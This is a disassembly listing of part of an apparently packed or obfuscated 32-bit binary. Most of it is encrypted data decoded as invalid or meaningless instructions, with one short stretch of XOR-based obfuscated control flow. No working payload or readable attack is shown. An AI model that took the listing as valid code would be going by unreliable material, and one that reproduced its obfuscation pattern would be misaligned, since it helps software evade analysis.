  410a62:	jae    0x410aa8
  410a64:	(bad)  
  410a65:	cwde   
  410a66:	lds    ecx,FWORD PTR ds:0x372ffc05
  410a6c:	sbb    esi,DWORD PTR [eax+0x51]
  410a6f:	dec    edx
  410a70:	mov    esp,0xae250a76
  410a75:	imul   ebp,DWORD PTR [edx+0xe8e3184],0x89434245
  410a7f:	mov    bl,BYTE PTR [ecx+edi*8+0x22]
  410a83:	test   BYTE PTR [edi-0x6e36f0e8],0x69
  410a8a:	(bad)  
  410a8b:	mov    ebx,0x4c917333
  410a90:	loop   0x410a61
  410a92:	or     BYTE PTR [ecx+edx*2-0x200435ed],dh
  410a99:	or     edx,DWORD PTR [edi]
  410a9b:	sahf   
  410a9c:	mov    al,0x3e
  410a9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a9f:	lods   al,BYTE PTR ds:[esi]
  410aa0:	mov    ecx,0xe7f6fa7f
  410aa5:	mov    DWORD PTR [eax],eax
  410aa7:	and    eax,0xfd68c339
  410aac:	jbe    0x410a71
  410aae:	and    BYTE PTR [ebx],cl
  410ab0:	out    0xb2,eax
  410ab2:	xchg   ebp,eax
  410ab3:	fs and bl,ch
  410ab6:	cli    
  410ab7:	sbb    DWORD PTR [edx+0x2f258f61],ebp
  410abd:	dec    esp
  410abe:	or     ebp,DWORD PTR [edi+0x4676cea0]
  410ac4:	jmp    0xca04:0x616a668e
  410acb:	test   DWORD PTR [ebp+0x50],0xa7365326
  410ad2:	mov    ch,BYTE PTR [edi+0x1c49b631]
  410ad8:	add    BYTE PTR [ebp+0x7d],ah
  410adb:	pop    ebp
  410adc:	enter  0xefb4,0xfe
  410ae0:	sbb    BYTE PTR [ebp-0x25],al
  410ae3:	inc    esp
  410ae4:	aad    0xe3
  410ae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ae7:	pop    edi
  410ae8:	or     edi,DWORD PTR [esi-0x428f09c1]
  410aee:	stos   BYTE PTR es:[edi],al
  410aef:	jle    0x410ac8
  410af1:	hlt    
  410af2:	outs   dx,BYTE PTR ds:[esi]
  410af3:	xchg   edx,eax
  410af4:	add    ch,BYTE PTR [edi-0x3f82d31c]
  410afa:	adc    al,0x3c
  410afc:	sbb    eax,0x623206e1
  410b01:	mov    bl,0x7b
  410b03:	arpl   WORD PTR [eax],bp
  410b05:	cmp    bl,BYTE PTR [edx+edx*4-0x14c8abd0]
  410b0c:	test   eax,0x66b62f24
  410b11:	icebp  
  410b12:	dec    ebp
  410b13:	outs   dx,BYTE PTR ds:[esi]
  410b14:	inc    eax
  410b15:	outs   dx,BYTE PTR ds:[esi]
  410b16:	pop    esi
  410b17:	inc    ebx
  410b18:	add    dl,BYTE PTR [esi]
  410b1a:	sub    esp,ecx
  410b1c:	cmc    
  410b1d:	sahf   
  410b1e:	jae    0x410ad7
  410b20:	popa   
  410b21:	pop    ebx
  410b22:	sbb    ebx,edx
  410b24:	inc    ebp
  410b25:	dec    ecx
  410b26:	or     eax,0x1f114176
  410b2b:	bound  edx,QWORD PTR [ebx-0x221a5261]
  410b31:	and    cl,BYTE PTR [ebx+ebp*4-0x6f]
  410b35:	sbb    al,0x6a
  410b37:	dec    edi
  410b38:	xchg   edi,eax
  410b39:	dec    eax
  410b3a:	retf   
  410b3b:	fimul  DWORD PTR [esi]
  410b3d:	mov    esp,DWORD PTR [edx+0x602dccdc]
  410b43:	dec    DWORD PTR [ebp+ebx*1-0x29]
  410b47:	cmc    
  410b48:	xor    cl,ah
  410b4a:	or     DWORD PTR [edi+0x70],eax
  410b4d:	push   edx
  410b4e:	cmp    al,0x3
  410b50:	inc    edx
  410b51:	out    dx,eax
  410b52:	bound  edx,QWORD PTR [ebx]
  410b54:	inc    esp
  410b55:	in     al,0x44
  410b57:	aaa    
  410b58:	fild   QWORD PTR [ecx-0x16]
  410b5b:	in     eax,dx
  410b5c:	mov    al,0xb0
  410b5e:	(bad)  
  410b5f:	jns    0x410b3b
  410b61:	dec    edx
  410b62:	outs   dx,BYTE PTR ds:[esi]
  410b63:	mov    cl,0x72
  410b65:	int3   
  410b66:	mov    ds:0x30ad4ba3,al
  410b6b:	fbld   TBYTE PTR [ebx+0x67]
  410b6e:	stc    
  410b6f:	das    
  410b70:	mov    cl,0xa2
  410b72:	pop    ss
  410b73:	add    al,0xf5
  410b75:	jae    0x410b7a
  410b77:	mov    cl,0x8c
  410b79:	xchg   edx,eax
  410b7a:	shr    BYTE PTR [esi+0x4a],0x29
  410b7e:	dec    edi
  410b7f:	mov    eax,ds:0x2186b042
  410b84:	mov    ebp,0x8033c328
  410b89:	fisttp DWORD PTR [esi]
  410b8b:	jg     0x410ba2
  410b8d:	ins    BYTE PTR es:[edi],dx
  410b8e:	sti    
  410b8f:	mov    gs,WORD PTR [eax-0x80]
  410b92:	lock push esp
  410b94:	jnp    0x410b5c
  410b96:	push   0xdd3aa0c3
  410b9b:	fcomp  QWORD PTR [esi-0x42]
  410b9e:	arpl   WORD PTR ds:0xe0dc0d32,bx
  410ba4:	repz or dl,dl
  410ba7:	bnd jmp 0x7616713d
  410bad:	cmp    bl,al
  410baf:	dec    ebp
  410bb0:	fs out 0x72,eax
  410bb3:	mov    ebp,0xe6ae2208
  410bb8:	jns    0x410ba8
  410bba:	stos   DWORD PTR es:[edi],eax
  410bbb:	popa   
  410bbc:	cs dec edi
  410bbe:	inc    edi
  410bbf:	(bad)  
  410bc0:	les    edx,FWORD PTR [edx+0x20]
  410bc3:	sbb    DWORD PTR [ecx+0x13],edi
  410bc6:	cmp    eax,0x6c87ca7a
  410bcb:	popf   
  410bcc:	sahf   
  410bcd:	out    0xab,al
  410bcf:	pop    esp
  410bd0:	imul   ebp,DWORD PTR ds:0x585b383d,0xce7b2923
  410bda:	jg     0x410c2b
  410bdc:	sbb    cl,bl
  410bde:	push   0x76
  410be0:	or     esi,0x55
  410be3:	stos   DWORD PTR es:[edi],eax
  410be4:	out    0x1a,eax
  410be6:	cmp    DWORD PTR ds:0x55f755f8,0xffffffd5
  410bed:	xlat   BYTE PTR ds:[ebx]
  410bee:	mov    ah,0xeb
  410bf0:	mov    al,0x4e
  410bf2:	push   esi
  410bf3:	test   eax,0xacee0094
  410bf8:	ins    DWORD PTR es:[edi],dx
  410bf9:	adc    esp,edx
  410bfb:	inc    esp
  410bfc:	sbb    DWORD PTR [edx+0x77bd1182],edx
  410c02:	fmulp  st(0),st
  410c04:	les    ebx,FWORD PTR [eax-0x28]
  410c07:	jns    0x410b92
  410c09:	gs push edx
  410c0b:	ins    BYTE PTR es:[edi],dx
  410c0c:	(bad)  
  410c0d:	aam    0xbd
  410c0f:	fs jp  0x410bb8
  410c12:	test   edi,ebp
  410c14:	or     DWORD PTR fs:[ebx-0x69],0xeee70df8
  410c1c:	xor    BYTE PTR [esi],dl
  410c1e:	xchg   BYTE PTR [ecx],bl
  410c20:	mov    bl,0xc4
  410c22:	div    cl
  410c24:	jge    0x410c35
  410c26:	add    eax,0xce3b221c
  410c2b:	mov    WORD PTR [eax-0x6a],?
  410c2e:	sub    eax,0x2154ef85
  410c33:	sahf   
  410c34:	mov    ?,WORD PTR [ecx]
  410c36:	and    dl,BYTE PTR fs:[ebp+edi*8-0xe]
  410c3b:	fadd   st(0),st
  410c3d:	lods   eax,DWORD PTR cs:[esi]
  410c3f:	mov    dh,0x9f
  410c41:	mov    ah,0xe
  410c43:	mov    ch,0x5b
  410c45:	lock scas al,BYTE PTR es:[edi]
  410c47:	fiadd  DWORD PTR [edi-0x4b9a6f95]
  410c4d:	xor    al,0xa1
  410c4f:	or     al,0xe
  410c51:	es ret 
  410c53:	cmc    
  410c54:	das    
  410c55:	pushf  
  410c56:	jns    0x410bf8
  410c58:	in     eax,0xf0
  410c5a:	(bad)  
  410c5b:	fbld   TBYTE PTR [eax]
  410c5d:	push   0x75173aa1
  410c62:	fidiv  WORD PTR [ecx]
  410c64:	add    eax,0xac9f2a7b
  410c69:	loope  0x410c07
  410c6b:	pop    edx
  410c6c:	dec    ebx
  410c6d:	jmp    0x57b157f0
  410c72:	jnp    0x410c88
  410c74:	(bad)  
  410c75:	jne    0x410cd7
  410c77:	mov    bh,0x46
  410c79:	stc    
  410c7a:	push   edi
  410c7b:	push   cs
  410c7c:	fsubr  QWORD PTR [edx*1+0x2cfc4dcf]
  410c83:	push   eax
  410c84:	ja     0x410cde
  410c86:	jge    0x410c32
  410c88:	push   esi
  410c89:	sbb    ecx,DWORD PTR gs:[edx+0x5a1864a6]
  410c90:	push   esp
  410c91:	adc    dl,ch
  410c93:	lahf   
  410c94:	cmp    dl,al
  410c96:	pop    ss
  410c97:	call   0xea79:0x5c356859
  410c9e:	daa    
  410c9f:	(bad)  
  410ca1:	push   ds
  410ca2:	jb     0x410c60
  410ca4:	or     edx,DWORD PTR [esi-0x593cea6d]
  410caa:	imul   esi,DWORD PTR [ebx-0x47],0xffffffa5
  410cae:	push   ecx
  410caf:	in     eax,0x98
  410cb1:	(bad)  
  410cb2:	xor    esp,DWORD PTR [esi]
  410cb4:	inc    ebx
  410cb5:	cmp    edi,0x40
  410cb8:	cmp    al,0x6a
  410cba:	sbb    eax,0x13303cd0
  410cbf:	mov    eax,DWORD PTR [ebx]
  410cc1:	push   ss
  410cc2:	lods   al,BYTE PTR ds:[esi]
  410cc3:	jns    0x410ca9
  410cc5:	aam    0x88
  410cc7:	arpl   bp,ax
  410cc9:	loop   0x410cee
  410ccb:	loope  0x410c5c
  410ccd:	icebp  
  410cce:	pop    edx
  410ccf:	mov    ch,BYTE PTR [edi]
  410cd1:	test   DWORD PTR [ebp-0x59],esp
  410cd4:	mov    gs,WORD PTR [edx-0x21]
  410cd7:	inc    esi
  410cd8:	mov    DWORD PTR [ebp+0x10],ecx
  410cdb:	mov    ecx,DWORD PTR ds:0x4345c7
  410ce1:	mov    DWORD PTR [ebp+0x8],0xf34ceba
  410ce8:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  410cef:	mov    ecx,DWORD PTR ds:0x4344e3
  410cf5:	mov    ecx,0xf89c8539
  410cfa:	push   esi
  410cfb:	mov    DWORD PTR [ebp+0x10],0x70019f8
  410d02:	mov    DWORD PTR ds:0x43460b,edx
  410d08:	mov    esi,DWORD PTR [ebp-0x4]
  410d0b:	cmp    ecx,esi
  410d0d:	mov    DWORD PTR ds:0x434613,0x165f
  410d17:	je     0x411018
  410d1d:	mov    esi,DWORD PTR [ebp+0xc]
  410d20:	xor    ecx,eax
  410d22:	sub    DWORD PTR ds:0x4345c7,0x434583
  410d2c:	xor    esi,eax
  410d2e:	xor    DWORD PTR ds:0x434607,0x6bfa
  410d38:	lea    ecx,[esi+ecx*1+0x327299]
  410d3f:	xor    ecx,eax
  410d41:	cmp    ecx,0xf89c8526
  410d47:	jne    0x410cfb
  410d4d:	mov    DWORD PTR ds:0x43458f,0x7d20
  410d57:	jmp    0x411302
  410d5c:	jmp    0x411018
  410d61:	inc    ebp
  410d62:	lods   al,BYTE PTR ds:[esi]
  410d63:	xchg   DWORD PTR [ebx],ebx
  410d65:	addr16 and eax,0xe5906c6d
  410d6b:	mov    DWORD PTR [ebx+0x78b33341],esi
  410d71:	leave  
  410d72:	dec    ebp
  410d73:	jle    0x410df3
  410d75:	popf   
  410d76:	js     0x410df6
  410d78:	jle    0x410de0
  410d7a:	jg     0x410d99
  410d7c:	push   DWORD PTR [eax]
  410d7e:	jbe    0x410df9
  410d80:	dec    ecx
  410d81:	xchg   esp,eax
  410d82:	neg    eax
  410d84:	ins    DWORD PTR es:[edi],dx
  410d85:	fldenv [esi+0x38]
  410d88:	sub    DWORD PTR ds:0x67de6b33,ebx
  410d8e:	jmp    0x410de1
  410d90:	dec    ebx
  410d91:	pop    esi
  410d92:	iret   
  410d93:	(bad)  
  410d94:	mov    esp,0x2d006227
  410d99:	loop   0x410dee
  410d9b:	sbb    eax,0x7619671b
  410da0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410da1:	ret    
  410da2:	nop
  410da3:	inc    ecx
  410da4:	inc    eax
  410da5:	fwait
  410da6:	jl     0x410de6
  410da8:	and    al,BYTE PTR [ecx+ecx*2]
  410dab:	stc    
  410dac:	mov    esi,0xb6b91a35
  410db1:	adc    al,0xf4
  410db3:	inc    esp
  410db4:	mov    ecx,0x3c5999e0
  410db9:	cli    
  410dba:	in     al,0x8b
  410dbc:	pop    es
  410dbd:	and    eax,0xc9786b9b
  410dc2:	sar    DWORD PTR [esi+0x3605ab05],0xdc
  410dc9:	(bad)  
  410dca:	(bad)  
  410dcc:	inc    ebp
  410dcd:	jbe    0x410d83
  410dcf:	or     edi,0xffffffcb
  410dd2:	ds ds int3 
  410dd5:	adc    ecx,ebp
  410dd7:	shl    DWORD PTR ds:[edi-0x5d3d6986],0xa0
  410ddf:	popf   
  410de0:	mov    edx,0x32c35f83
  410de5:	ret    0xa34
  410de8:	mov    ecx,0xe10e732f
  410ded:	fst    QWORD PTR [edx]
  410def:	mov    al,BYTE PTR [ebx-0x37]
  410df2:	mov    ch,0xb4
  410df4:	jl     0x410e15
  410df6:	mov    esi,0x97f89c31
  410dfb:	add    esp,edx
  410dfd:	add    cl,BYTE PTR [eax+0x4f]
  410e00:	mov    ebp,DWORD PTR [edx-0x44b8e38d]
  410e06:	pushw  ds
  410e08:	ins    BYTE PTR es:[edi],dx
  410e09:	mov    eax,ds:0x574364d
  410e0e:	popa   
  410e0f:	cs iret 
  410e11:	ret    0x9258
  410e14:	mov    bl,0xe4
  410e16:	mov    eax,0x915588fe
  410e1b:	cmp    BYTE PTR [esi],ch
  410e1d:	ins    DWORD PTR es:[edi],dx
  410e1e:	pop    ebx
  410e1f:	mov    esp,0x2a99e5bb
  410e24:	inc    ebx
  410e25:	pop    esi
  410e26:	cmc    
  410e27:	push   eax
  410e28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e29:	out    dx,eax
  410e2a:	inc    eax
  410e2b:	push   esi
  410e2c:	retf   0xdc3b
  410e2f:	xchg   edi,eax
  410e30:	test   BYTE PTR [ebx+0x42],dh
  410e33:	dec    edx
  410e34:	mov    WORD PTR [eax-0x6ffb9c59],ds
  410e3a:	das    
  410e3b:	xor    BYTE PTR [esi+0x6d8c497b],ch
  410e41:	pushf  
  410e42:	in     eax,0xe6
  410e44:	pop    ss
  410e45:	pop    ss
  410e46:	inc    ebp
  410e47:	cmc    
  410e48:	mov    bl,0x7e
  410e4a:	xlat   BYTE PTR ds:[ebx]
  410e4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e4c:	jp     0x410e1d
  410e4e:	std    
  410e4f:	daa    
  410e50:	cs sti 
  410e52:	push   0x82ab7d39
  410e57:	and    eax,0x8691c939
  410e5c:	xchg   ebx,eax
  410e5d:	and    eax,DWORD PTR [eax+0x4f]
  410e60:	cmp    edx,DWORD PTR [ecx+0x76]
  410e63:	rcr    WORD PTR [edx+0x5e5461eb],1
  410e6a:	stos   DWORD PTR es:[edi],eax
  410e6b:	xor    eax,0x122adf6b
  410e70:	int3   
  410e71:	adc    ebx,ebp
  410e73:	stc    
  410e74:	xchg   edi,ebx
  410e76:	aad    0x71
  410e78:	cwde   
  410e79:	hlt    
  410e7a:	and    cl,BYTE PTR [edx]
  410e7c:	xchg   ecx,eax
  410e7d:	adc    eax,0x1d70c586
  410e82:	mov    edi,0x8e3259c8
  410e87:	jnp    0x410efa
  410e89:	push   ebp
  410e8a:	dec    ebx
  410e8b:	adc    ecx,edx
  410e8d:	mov    dh,0x22
  410e8f:	cmp    esp,edi
  410e91:	pop    esp
  410e92:	jns    0x410e24
  410e94:	rcl    BYTE PTR [ebx-0x50911b00],1
  410e9a:	retf   
  410e9b:	ficomp WORD PTR [esp+eiz*8]
  410e9e:	xlat   BYTE PTR ds:[ebx]
  410e9f:	es int3 
  410ea1:	jbe    0x410e51
  410ea3:	cdq    
  410ea4:	aad    0x4e
  410ea6:	jmp    0x410eed
  410ea8:	xor    eax,0x91b912a4
  410ead:	imul   esi,DWORD PTR [ebx],0x65940216
  410eb3:	loop   0x410e6f
  410eb5:	loopne 0x410e3e
  410eb7:	scas   al,BYTE PTR es:[edi]
  410eb8:	inc    ecx
  410eb9:	dec    esi
  410eba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ebb:	cmp    al,0x37
  410ebd:	mov    al,0xfd
  410ebf:	or     ch,ah
  410ec1:	imul   eax,DWORD PTR [edx-0x784ffac2],0x39a0b0bc
  410ecb:	shl    BYTE PTR [ebp+0x23],0x54
  410ecf:	and    ah,BYTE PTR [ebx+0x4e529394]
  410ed5:	sub    ah,BYTE PTR [edx+0x40]
  410ed8:	mov    ah,0x9a
  410eda:	push   0xcb5dc67f
  410edf:	mov    ebp,0xe5685fbf
  410ee4:	test   eax,0x1f8d4eef
  410ee9:	loope  0x410ef6
  410eeb:	les    edx,FWORD PTR [edx-0x72]
  410eee:	(bad)  
  410eef:	push   edi
  410ef0:	and    edi,esi
  410ef2:	sub    BYTE PTR [esi+esi*4],ch
  410ef5:	test   al,0xc0
  410ef7:	jns    0x410ec4
  410ef9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410efa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410efb:	or     eax,DWORD PTR ds:0x536ea074
  410f01:	ret    
  410f02:	(bad)  
  410f04:	arpl   WORD PTR [edx],bx
  410f06:	xor    eax,0x8e64c7df
  410f0b:	lds    ebx,FWORD PTR [edx+0x2]
  410f0e:	rcl    BYTE PTR [edi],1
  410f10:	dec    BYTE PTR [ecx+0x5d3af8c4]
  410f16:	jae    0x410f4e
  410f18:	test   al,0xf4
  410f1a:	ds fs inc ebx
  410f1d:	cmc    
  410f1e:	jg     0x410ec5
  410f20:	xchg   edx,eax
  410f21:	cwde   
  410f22:	icebp  
  410f23:	push   eax
  410f24:	xor    dh,cl
  410f26:	nop
  410f27:	aam    0x46
  410f29:	jmp    0xb6c8:0xdd8ced86
  410f30:	outs   dx,BYTE PTR ds:[esi]
  410f31:	add    ah,ch
  410f33:	jo     0x410eba
  410f35:	jg     0x410ef9
  410f37:	inc    DWORD PTR [ebx+0x65]
  410f3a:	inc    edx
  410f3b:	mov    ?,WORD PTR [ecx]
  410f3d:	pop    edx
  410f3e:	retf   
  410f3f:	cwde   
  410f40:	or     al,0x9e
  410f42:	iret   
  410f43:	lods   al,BYTE PTR ds:[esi]
  410f44:	mov    esp,0x7ea36523
  410f49:	mov    ch,BYTE PTR [esi+eiz*8+0x3214b4db]
  410f50:	pop    esp
  410f51:	pop    esi
  410f52:	out    dx,eax
  410f53:	jno    0x410f45
  410f55:	aaa    
  410f56:	sub    eax,0x87fa12ce
  410f5b:	inc    edx
  410f5c:	mov    ah,0x66
  410f5e:	imul   edx,DWORD PTR [eax-0x6e],0xd1bbb4f6
  410f65:	mov    BYTE PTR [ecx+0x7a],bl
  410f68:	cmp    ebx,ecx
  410f6a:	ror    DWORD PTR [ecx+0x2cc90c7f],0x51
  410f71:	jbe    0x410f56
  410f73:	inc    ebp
  410f74:	mov    ebx,0xb4ef60f0
  410f79:	mov    edi,0xdcacc87a
  410f7e:	jb     0x410f65
  410f80:	push   ecx
  410f81:	mov    esi,0x2450282e
  410f86:	pusha  
  410f87:	fwait
  410f88:	pop    esp
  410f89:	mov    edi,DWORD PTR [edx+0x6f]
  410f8c:	inc    edi
  410f8d:	push   ebp
  410f8e:	ds xor eax,0xf6582449
  410f94:	dec    esp
  410f95:	mov    BYTE PTR [eax+eax*8],ah
  410f98:	repz adc eax,edx
  410f9b:	cmc    
  410f9c:	and    eax,0x23da0a4f
  410fa1:	mov    bh,BYTE PTR [edi]
  410fa3:	push   0x6d9edc6b
  410fa8:	mov    DWORD PTR [ecx-0x1b5c08a2],eax
  410fae:	dec    edx
  410faf:	mov    edx,0x9f8133cc
  410fb4:	jl     0x410f64
  410fb6:	outs   dx,DWORD PTR ds:[esi]
  410fb7:	dec    ebx
  410fb8:	cmp    al,0xb5
  410fba:	adc    DWORD PTR [edi-0x40],0x168cc59b
  410fc1:	jno    0x410ffe
  410fc3:	sub    eax,0xe1766862
  410fc8:	xchg   edi,edx
  410fca:	pop    edi
  410fcb:	jae    0x410f4d
  410fcd:	je     0x410fe7
  410fcf:	cmc    
  410fd0:	sti    
  410fd1:	sti    
  410fd2:	cwde   
  410fd3:	push   ebx
  410fd4:	mov    ds:0xdaecc4b5,al
  410fd9:	dec    edi
  410fda:	pop    ebx
  410fdb:	sti    
  410fdc:	and    dl,al
  410fde:	(bad)  
  410fdf:	out    0xae,eax
  410fe1:	out    dx,eax
  410fe2:	or     DWORD PTR [ebx+0x67],ecx
  410fe5:	mov    ecx,0x9116e
  410fea:	or     al,0x32
  410fec:	js     0x410fff
  410fee:	daa    
  410fef:	and    al,0xf3
  410ff1:	jecxz  0x411006
  410ff3:	loope  0x410fb9
  410ff5:	xor    al,BYTE PTR [esi+0x12]
  410ff8:	dec    ebx
  410ff9:	fisttp DWORD PTR [esi-0x58]
  410ffc:	sub    BYTE PTR [edx-0x41],al
  410fff:	inc    ecx
  411000:	and    ecx,0x53
  411003:	repz and bl,BYTE PTR [edi-0x45]
  411007:	js     0x410fb3
  411009:	fld    DWORD PTR [edi-0x7b]
  41100c:	dec    ecx
  41100d:	lods   al,BYTE PTR ds:[esi]
  41100e:	push   0x6942eaee
  411013:	lods   al,BYTE PTR ds:[esi]
  411014:	clc    
  411015:	pushf  
  411016:	fld    QWORD PTR [esi-0x7f]
  411019:	shl    DWORD PTR [edi-0x73],0xcd
  41101d:	dec    DWORD PTR [ebx+0x3f033f1]
  411023:	jne    0x41102d
  411025:	mov    DWORD PTR [ebp+0x8],esi
  411028:	mov    esi,DWORD PTR [ebp+0x8]
  41102b:	xor    esi,ecx
  41102d:	jmp    0x4112e9
  411032:	jo     0x41107c
  411034:	rsqrtps xmm6,XMMWORD PTR [edi]
  411037:	pop    ebp
  411038:	jge    0x4110ae
  41103a:	pop    ecx
  41103b:	mov    ebx,0x47a4754
  411040:	mov    dl,0xa
  411042:	push   0x9d7e7e4f
  411047:	js     0x4110c7
  411049:	jle    0x411003
  41104b:	pushf  
  41104c:	in     al,dx
  41104d:	jle    0x411016
  41104f:	call   0x6b48:0xdc924fc0
  411056:	cld    
  411057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411058:	xor    eax,0x1f51413d
  41105d:	leave  
  41105e:	(bad)  
  41105f:	rcr    dh,cl
  411061:	xor    BYTE PTR [ebx-0x7e],dl
  411064:	es pop es
  411066:	adc    DWORD PTR [ecx],esp
  411068:	jbe    0x4110d5
  41106a:	mov    BYTE PTR [ebp+0x4cbbc7c4],al
  411070:	outs   dx,DWORD PTR ds:[esi]
  411071:	sub    bh,0x26
  411074:	sti    
  411075:	sub    DWORD PTR [edx-0x73],eax
  411078:	int3   
  411079:	rcl    BYTE PTR [ebp+0x4b46b1e5],0x53
  411080:	ror    cl,cl
  411082:	jno    0x4110a1
  411084:	mov    bl,dh
  411086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411087:	pushf  
  411088:	mov    cl,0x8d
  41108a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41108b:	dec    ecx
  41108c:	dec    edx
  41108d:	jns    0x4110f4
  41108f:	pop    esp
  411090:	call   0x18db:0x324a5723
  411097:	mov    dl,0xac
  411099:	ins    BYTE PTR es:[edi],dx
  41109a:	mov    eax,0x77805a26
  41109f:	dec    esi
  4110a0:	in     al,dx
  4110a1:	pop    ebx
  4110a2:	nop    DWORD PTR [esi+eax*4]
  4110a6:	mov    ds:0x97a213d0,eax
  4110ab:	es and eax,0x43084377
  4110b1:	imul   ebp,DWORD PTR [esi+0x2d],0x71
  4110b5:	or     ebx,DWORD PTR ds:0xedb6392e
  4110bb:	or     ch,bl
  4110bd:	rcl    BYTE PTR [edx-0x7a25b7b9],0x86
  4110c4:	neg    DWORD PTR [esi-0x6b]
  4110c7:	icebp  
  4110c8:	or     ebx,edx
  4110ca:	xchg   ebx,eax
  4110cb:	or     al,0xa6
  4110cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110ce:	cmp    al,0xb
  4110d0:	inc    esp
  4110d1:	int3   
  4110d2:	nop
  4110d3:	aas    
  4110d4:	daa    
  4110d5:	push   0x9dc72934
  4110da:	mov    ah,0xed
  4110dc:	ja     0x4110c6
  4110de:	test   BYTE PTR fs:0x97b53883,0x90
  4110e6:	scas   eax,DWORD PTR es:[edi]
  4110e7:	in     eax,0xc5
  4110e9:	push   0xffffffa5
  4110eb:	enter  0x726b,0x49
  4110ef:	xchg   ebx,eax
  4110f0:	xchg   esp,eax
  4110f1:	jo     0x411120
  4110f3:	cmp    DWORD PTR [edi],0xcf7a9de0
  4110f9:	pop    edi
  4110fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110fb:	lea    edx,[ecx]
  4110fd:	cmp    al,BYTE PTR [ecx+0x4033ea35]
  411103:	push   ecx
  411104:	lods   al,BYTE PTR ds:[esi]
  411105:	shl    DWORD PTR ds:0xff9172d9,1
  41110b:	jp     0x4110c2
  41110d:	or     DWORD PTR [ecx-0x7cecf2bb],ecx
  411113:	fistp  WORD PTR [edi]
  411115:	sbb    eax,0x27fba4ae
  41111a:	jae    0x41117e
  41111c:	adc    edx,DWORD PTR [ebx+0x27c48a72]
  411122:	rol    BYTE PTR [ecx+0x3d],0x96
  411126:	mov    cl,0xe
  411128:	jg     0x41118e
  41112a:	ficomp WORD PTR [edi+0x16e4777f]
  411130:	xchg   esi,eax
  411131:	outs   dx,BYTE PTR ds:[esi]
  411132:	xchg   ch,ch
  411134:	push   es
  411135:	and    dh,0xdc
  411138:	cmp    eax,0x5fe50726
  41113d:	mov    ebp,0x90c8d73c
  411142:	pushf  
  411143:	push   ds
  411144:	test   DWORD PTR [edx+0x68],ebp
  411147:	add    al,0xf8
  411149:	mov    bh,dl
  41114b:	mov    edx,0x10cdc027
  411150:	aam    0x69
  411152:	add    eax,0x5013a3c3
  411157:	push   cs
  411158:	aaa    
  411159:	mov    ebp,0xbd0d94de
  41115e:	sbb    ah,BYTE PTR [ecx+0x4a265a16]
  411164:	add    DWORD PTR [edx],edi
  411166:	xor    al,0xd3
  411168:	mov    dl,0x89
  41116a:	mov    eax,0x515a3f0b
  41116f:	test   BYTE PTR [ecx],ah
  411171:	call   0x595289bf
  411176:	test   DWORD PTR [ecx-0x42],ebp
  411179:	pop    esp
  41117a:	aaa    
  41117b:	int    0xd
  41117d:	mov    al,ds:0x421e323f
  411182:	mov    ds:0xd7b81030,eax
  411187:	in     al,0x39
  411189:	and    edi,edi
  41118b:	and    eax,0xf9fcd45e
  411190:	iret   
  411191:	or     bh,BYTE PTR [eax-0x131b7474]
  411197:	les    edi,FWORD PTR [edi]
  411199:	data16 ja 0x41115d
  41119c:	scas   eax,DWORD PTR es:[edi]
  41119d:	inc    edi
  41119e:	adc    DWORD PTR [esi+0x2d],0xfffffff2
  4111a2:	enter  0x4e9,0x1c
  4111a6:	sahf   
  4111a7:	imul   ebp,DWORD PTR [ebp-0x29],0xffffffcf
  4111ab:	outs   dx,BYTE PTR ds:[esi]
  4111ac:	das    
  4111ad:	xlat   BYTE PTR ds:[ebx]
  4111ae:	mov    dh,0xa6
  4111b0:	shl    DWORD PTR [eax+0x66a122ae],cl
  4111b6:	push   edx
  4111b7:	or     eax,0x3c0cbab8
  4111bc:	push   0x4
  4111be:	pop    ds
  4111bf:	sbb    DWORD PTR [edx+edx*8],ebx
  4111c2:	addr16 dec ebx
  4111c4:	jmp    0xacfb:0xf2505bb
  4111cb:	jge    0x411204
  4111cd:	push   ebp
  4111ce:	add    eax,0x47566441
  4111d3:	ins    DWORD PTR es:[edi],dx
  4111d4:	mov    cl,0x4f
  4111d6:	(bad)
  4111da:	dec    eax
  4111db:	(bad)  
  4111dc:	cmc    
  4111dd:	imul   eax,DWORD PTR [esi+0x64],0xffffffc6
  4111e1:	iret   
  4111e2:	jle    0x4111b7
  4111e4:	and    DWORD PTR [esi+ebx*1-0x4a1d9504],ecx
  4111eb:	adc    bh,BYTE PTR [esi]
  4111ed:	ds pushf 
  4111ef:	jnp    0x41118e
  4111f1:	pop    esi
  4111f2:	in     al,0x5f
  4111f4:	mov    esi,0xcd644e72
  4111f9:	js     0x41118c
  4111fb:	shl    DWORD PTR [esi],0xf1
  4111fe:	push   eax
  4111ff:	pusha  
  411200:	mov    cl,0x71
  411202:	or     edx,DWORD PTR [esp+esi*8]
  411205:	cmc    
  411206:	mov    bh,0x72
  411208:	pop    ss
  411209:	out    0x4f,al
  41120b:	stos   DWORD PTR es:[edi],eax
  41120c:	pop    esp
  41120d:	pop    esi
  41120e:	fcomip st,st(4)
  411210:	mov    esp,0xf8f72bba
  411215:	xor    BYTE PTR [esi-0x3e7cc6f0],0x3c
  41121c:	cli    
  41121d:	and    al,0xa1
  41121f:	mov    dl,0xd1
  411221:	pushf  
  411222:	sub    ebp,ebx
  411224:	sahf   
  411225:	dec    ecx
  411226:	push   0x6b989be4
  41122b:	mov    bh,0x25
  41122d:	clc    
  41122e:	xlat   BYTE PTR ds:[ebx]
  41122f:	out    dx,al
  411230:	stos   DWORD PTR es:[edi],eax
  411231:	loop   0x41122e
  411233:	loopne 0x4111d7
  411235:	icebp  
  411236:	xlat   BYTE PTR ds:[ebx]
  411237:	jmp    0x411235
  411239:	inc    esp
  41123a:	or     al,0xbf
  41123c:	xor    al,0x1d
  41123e:	push   edi
  41123f:	lahf   
  411240:	in     al,dx
  411241:	add    bh,BYTE PTR [ebx+0x61bb5438]
  411247:	repz and eax,0xd001d837
